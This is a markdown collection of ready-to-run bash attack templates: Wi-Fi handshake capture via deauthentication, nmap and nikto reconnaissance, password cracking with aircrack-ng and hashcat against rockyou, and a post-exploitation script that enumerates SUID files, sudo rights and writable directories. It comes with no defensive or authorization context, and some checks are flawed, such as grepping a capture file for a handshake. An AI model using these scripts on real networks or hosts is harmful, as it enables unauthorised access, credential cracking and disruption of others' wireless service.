# Script Templates

## 1. Basic Security Script Template

```bash
#!/usr/bin/env bash
set -Eeuo pipefail
trap cleanup SIGINT SIGTERM ERR EXIT

readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_NAME="$(basename "$0")"
readonly LOG_FILE="/var/log/${SCRIPT_NAME%.sh}.log"

function log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

function cleanup() {
    local exit_code=$?
    # Cleanup code here
    exit $exit_code
}

function check_root() {
    if [[ $EUID -ne 0 ]]; then
        log "ERROR" "Must run as root"
        exit 1
    fi
}

function check_dependencies() {
    local deps=("$@")
    for dep in "${deps[@]}"; do
        command -v "$dep" >/dev/null 2>&1 || {
            log "ERROR" "Missing: $dep"
            exit 1
        }
    done
}

function main() {
    check_root
    check_dependencies airmon-ng airodump-ng aireplay-ng
    log "INFO" "Starting $SCRIPT_NAME"
    # Your logic here
}

main "$@"
```

## 2. Wireless Handshake Capture Script

```bash
#!/usr/bin/env bash
set -e

TARGET_BSSID="${1:-}"
CHANNEL="${2:-6}"
OUTPUT="capture"

if [[ -z "$TARGET_BSSID" ]]; then
    echo "Usage: $0 <BSSID> [channel]"
    echo "Example: $0 AA:BB:CC:DD:EE:FF 6"
    exit 1
fi

echo "[*] Starting monitor mode..."
airmon-ng check kill
airmon-ng start wlan0

echo "[*] Capturing handshake for $TARGET_BSSID on channel $CHANNEL"
xterm -e "airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w $OUTPUT wlan0mon" &
DUMP_PID=$!

sleep 2
echo "[*] Sending deauth packets..."
aireplay-ng --deauth 5 -a "$TARGET_BSSID" wlan0mon

sleep 15
kill $DUMP_PID 2>/dev/null

echo "[*] Checking for handshake..."
if grep -q "WPA handshake" ${OUTPUT}-01.cap 2>/dev/null; then
    echo "[+] Handshake captured!"
else
    echo "[!] No handshake captured"
fi

airmon-ng stop wlan0mon
```

## 3. Network Scanner Script

```bash
#!/usr/bin/env bash
set -e

TARGET="${1:-}"
OUTPUT="scan"

if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <target>"
    exit 1
fi

echo "[*] Starting network scan on $TARGET"

echo "[*] Nmap scan..."
nmap -sV -sC -O -oA "$OUTPUT" "$TARGET"

echo "[*] Scan complete. Results in ${OUTPUT}* files"
```

## 4. Password Cracker Script

```bash
#!/usr/bin/env bash
set -e

HASH_FILE="${1:-}"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"

if [[ -z "$HASH_FILE" ]] || [[ -z "$WORDLIST" ]]; then
    echo "Usage: $0 <hash_file> [wordlist]"
    exit 1
fi

if [[ ! -f "$HASH_FILE" ]]; then
    echo "Error: Hash file not found"
    exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
    echo "Error: Wordlist not found"
    exit 1
fi

echo "[*] Starting password crack..."
echo "[*] Hash file: $HASH_FILE"
echo "[*] Wordlist: $WORDLIST"

# Detect hash type
echo "[*] Detecting hash type..."
hashid "$HASH_FILE"

# Try aircrack
echo "[*] Trying aircrack-ng..."
timeout 300 aircrack-ng -w "$WORDLIST" "$HASH_FILE" && exit 0

# Try hashcat (if hash file is in correct format)
echo "[*] Trying hashcat..."
hashcat -m 0 "$HASH_FILE" "$WORDLIST"

echo "[!] Crack failed or timed out"
```

## 5. Reconnaissance Script

```bash
#!/usr/bin/env bash
set -e

TARGET="${1:-}"
OUTPUT_DIR="recon-$(date +%Y%m%d-%H%M%S)"

if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <target>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Starting reconnaissance on $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

# DNS enumeration
echo "[*] DNS enumeration..."
dig +short "$TARGET" > dns.txt
host "$TARGET" >> dns.txt 2>/dev/null || true

# Nmap scan
echo "[*] Nmap scan..."
nmap -sV -sC -O -oA nmap "$TARGET"

# Nikto
echo "[*] Nikto scan..."
nikto -h "$TARGET" -o nikto.txt 2>/dev/null || true

# WhatWeb
echo "[*] WhatWeb..."
whatweb "$TARGET" --log-xml whatweb.xml 2>/dev/null || true

echo "[*] Reconnaissance complete"
echo "[*] Results in $OUTPUT_DIR"
```

## 6. Post-Exploitation Script

```bash
#!/usr/bin/env bash
set -e

echo "[*] Gathering system information..."

echo "[*] System info..."
uname -a > system_info.txt
cat /etc/os-release >> system_info.txt

echo "[*] Network info..."
ip addr show >> network_info.txt
ip route show >> network_info.txt
cat /etc/resolv.conf >> network_info.txt

echo "[*] User info..."
whoami >> user_info.txt
id >> user_info.txt
sudo -l >> user_info.txt 2>/dev/null || true

echo "[*] Process info..."
ps aux >> process_info.txt

echo "[*] Network connections..."
netstat -tulpn >> connections.txt 2>/dev/null || true

echo "[*] SUID files..."
find / -perm -4000 2>/dev/null >> suid_files.txt

echo "[*] Writable directories..."
find / -writable 2>/dev/null >> writable_dirs.txt 2>/dev/null || true

echo "[*] Collection complete"
```

## 7. Monitor Mode Toggle Script

```bash
#!/usr/bin/env bash

INTERFACE="${1:-wlan0}"
ACTION="${2:-start}"

case "$ACTION" in
    start)
        echo "[*] Enabling monitor mode on $INTERFACE"
        airmon-ng check kill
        airmon-ng start "$INTERFACE"
        ;;
    stop)
        echo "[*] Disabling monitor mode"
        airmon-ng stop "${INTERFACE}mon"
        ;;
    *)
        echo "Usage: $0 [interface] [start|stop]"
        echo "Example: $0 wlan0 start"
        exit 1
        ;;
esac

echo "[*] Current interfaces:"
iw dev
```
